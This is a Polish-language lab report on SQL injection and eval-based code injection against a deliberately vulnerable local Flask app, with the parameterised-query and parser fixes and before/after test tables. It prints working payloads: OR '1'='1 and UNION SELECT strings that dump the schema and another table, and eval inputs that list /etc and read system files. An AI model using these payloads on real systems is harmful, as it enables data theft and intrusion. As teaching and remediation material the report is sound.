# Dowody - Laboratorium 7 (SQL Injection i Code Injection)

Wyniki uzyskane lokalnie na dostarczonej aplikacji „Sejf sekretów" (Flask 3.1.3,
SQLite, obraz `python:3.12-alpine`). Aplikacja pod `http://127.0.0.1:8080`.
Baza zawiera wyłącznie fikcyjne dane. Tokenów ani kluczy prywatnych nie zapisywano.

Zapytanie wykonywane przez aplikację zwraca **dwie kolumny** (`wlasciciel`, `sekret`),
dlatego każdy `UNION SELECT` ma dwie kolumny.

## Zadanie 1 - SQL Injection (wersja podatna)

Podatność: `aplikacja/app.py`, trasa `/sekret` - klucz sklejany z zapytaniem:

```python
zapytanie = "SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '" + klucz + "'"
```

Zestaw bazowy pięciu wejść (tryb diagnostyczny pokazuje zapytanie po podstawieniu):

### 1. Legalny klucz `1234`

```
curl -G --data-urlencode "klucz=1234" http://127.0.0.1:8080/sekret
```

- SQL po podstawieniu: `SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '1234'`
- Wierszy: **1** → `anna: Hello world`

### 2. Sam apostrof `'`

```
curl -G --data-urlencode "klucz='" http://127.0.0.1:8080/sekret
```

- SQL po podstawieniu: `SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '''`
- Wierszy: **0**, błąd SQLite: `OperationalError: unrecognized token: "'''"`
- Pojedynczy apostrof wejścia zamyka literał i zostawia nieparzysty apostrof → błąd składni. To dowód, że wejście trafia do treści zapytania.

### 3. Zawsze prawdziwy warunek `' OR '1'='1`

```
curl -G --data-urlencode "klucz=' OR '1'='1" http://127.0.0.1:8080/sekret
```

- SQL po podstawieniu: `SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' OR '1'='1'`
- Wierszy: **4** (wszystkie sekrety: anna, piotr, muszkieter, admin)

### 4. UNION - nazwy tabel i ich definicje (schemat)

```
curl -G --data-urlencode "klucz=' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --" http://127.0.0.1:8080/sekret
```

- SQL po podstawieniu: `SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --'`
- Wierszy: **2**:
  - `konta` → `CREATE TABLE konta(login TEXT, rola TEXT, email TEXT)`
  - `sekrety` → `CREATE TABLE sekrety(klucz TEXT, wlasciciel TEXT, sekret TEXT)`
- Druga tabela: **`konta`**, kolumny: **`login`, `rola`, `email`**.

### 5. UNION - odczyt zawartości drugiej tabeli (`konta`)

```
curl -G --data-urlencode "klucz=' UNION SELECT login, rola||' '||email FROM konta --" http://127.0.0.1:8080/sekret
```

- SQL po podstawieniu: `SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' UNION SELECT login, rola||' '||email FROM konta --'`
- Wierszy: **2**:
  - `admin: administrator admin@lab7.example`
  - `anna: uzytkownik anna@lab7.example`

Wniosek: dane wejściowe domykają literał `'` i dopisują własną składnię SQL
(`OR`, `UNION SELECT`, `--`), więc zmieniają strukturę wykonywanego zapytania.

## Zadanie 2 - Zapytanie z parametrami (wersja poprawiona)

Poprawka (`aplikacja/app.py`): stałe zapytanie + parametr, bez apostrofów wokół `?`:

```python
ZAPYTANIE = "SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?"
wiersze = db.execute(ZAPYTANIE, (klucz,)).fetchall()
```

Szczegóły wyjątku SQLite → `app.logger.exception(...)`; użytkownik dostaje ogólny
komunikat „Wystapil blad podczas obslugi zapytania." Po `docker compose restart web`
powtórzono pięć wejść oraz szóste: legalny klucz z apostrofem `d'Artagnan`.

| #   | Wejście (klucz)                                          | Wierszy PRZED    | Wierszy PO                            |
| --- | -------------------------------------------------------- | ---------------- | ------------------------------------- |
| 1   | `1234`                                                   | 1                | 1                                     |
| 2   | `'`                                                      | 0 (błąd SQLite)  | 0 (bez błędu SQLite)                  |
| 3   | `' OR '1'='1`                                            | 4                | 0                                     |
| 4   | `' UNION SELECT name, sql FROM sqlite_master ... --`     | 2                | 0                                     |
| 5   | `' UNION SELECT login, rola…email FROM konta --` (pełny ładunek wyżej) | 2 | 0 |
| 6   | `d'Artagnan`                                             | 0 (błąd składni) | 1 (`muszkieter: Jeden za wszystkich`) |

Po poprawce żaden atak nie zwraca cudzych danych ani komunikatu SQLite, a oba
legalne klucze (`1234`, `d'Artagnan`) działają. Wartość parametru jest traktowana
jako dane, więc apostrof w `d'Artagnan` nie łamie zapytania. Parametr nie może
zastąpić nazwy tabeli ani kolumny - te muszą pochodzić z ustalonej listy w kodzie.

## Zadanie 3 - Code Injection w kalkulatorze

Podatność: `eval(wyrazenie)` w trasie `/kalkulator`. `eval` oblicza dowolne
wyrażenie Pythona, które może wywołać funkcje (`__import__`, `open`, `os.listdir`).

### Ładunki z kroku 2 (wersja podatna, bez zmiany kodu, samo pole `wyrazenie`)

```
curl -G --data-urlencode "wyrazenie=__import__('os').listdir('/etc')"        http://127.0.0.1:8080/kalkulator
curl -G --data-urlencode "wyrazenie=open('/etc/os-release').read()"          http://127.0.0.1:8080/kalkulator
curl -G --data-urlencode "wyrazenie=__import__('os').getuid()"               http://127.0.0.1:8080/kalkulator
```

Ładunki wykonują się przez `eval`. Wartości przechwycone z działającego kontenera
`python:3.12-alpine` (fragment `<output>` odpowiedzi):

- `__import__('os').listdir('/etc')` → lista plików `/etc`:
  `profile, services, group, udhcpc, nsswitch.conf, modules-load.d, modprobe.d, ssl1.1, shells, fstab, apk, securetty, hostname, issue, sysctl.d, secfixes.d, passwd, ssl, network, inittab, hosts, protocols, profile.d, mtab, busybox-paths.d, modules, motd, opt, logrotate.d, periodic, crontabs, shadow, sysctl.conf, os-release, alpine-release, resolv.conf, group-, shadow-, passwd-, terminfo, bindresvport.blacklist, krb5.conf, inputrc, netconfig, ca-certificates.conf, ca-certificates`
  (widoczne m.in. `passwd` i `shadow`).

- `open('/etc/os-release').read()` →
  
  ```
  NAME="Alpine Linux"
  ID=alpine
  VERSION_ID=3.24.4
  PRETTY_NAME="Alpine Linux v3.24"
  ```

- `__import__('os').getuid()` → **1000** (użytkownik `app`, utworzony `adduser -D -H app`).

Uwaga (dla chętnych, lab 5): `open('/etc/shadow').read()` przez ten sam kanał kończy
się `PermissionError`, bo proces działa jako nieuprzywilejowany UID 1000, a `/etc/shadow`
jest czytelny tylko dla roota. Code Injection daje więc prawa procesu, nie administratora.

### Poprawka - własny parser (bez `eval`/`exec`/`compile`)

```python
WZORZEC = re.compile(r"\s*(-?\d+(?:\.\d+)?)\s*([+\-*/])\s*(-?\d+(?:\.\d+)?)\s*")
OPERACJE = {"+": ..., "-": ..., "*": ..., "/": ...}
# limit 100 znaków; brak dopasowania -> 400; dzielenie przez zero -> 400
```

Tabela ośmiu testów po poprawce (`docker compose restart web`):

| #   | Wejście (`?wyrazenie=`)            | HTTP | Wynik                                  |
| --- | ---------------------------------- | ---- | -------------------------------------- |
| 1   | `2+3`                              | 200  | 5.0                                    |
| 2   | `7 / 2`                            | 200  | 3.5                                    |
| 3   | `-1.5*4`                           | 200  | -6.0                                   |
| 4   | `1/0`                              | 400  | „Bledne wejscie: dzielenie przez zero" |
| 5   | `__import__('os').listdir('/etc')` | 400  | „Bledne wejscie: nieprawidlowe dane"   |
| 6   | `open('/etc/os-release').read()`   | 400  | „Bledne wejscie: nieprawidlowe dane"   |
| 7   | `__import__('os').getuid()`        | 400  | „Bledne wejscie: nieprawidlowe dane"   |
| 8   | puste pole `?wyrazenie=`           | 400  | „Bledne wejscie: nieprawidlowe dane"   |

Dodatkowo: `2+3abc` → 400, wejście 101 znaków → 400, `/kalkulator` bez parametru → 200 (formularz).

Wniosek: lista dozwolonych operacji (`+ - * /`) dopuszcza tylko z góry znaną
gramatykę, więc dowolny kod Pythona jest odrzucany. Blokowanie słów (np. `import`)
zawodzi, bo wyrażenie może sięgnąć po funkcje i obiekty bez zakazanego słowa.
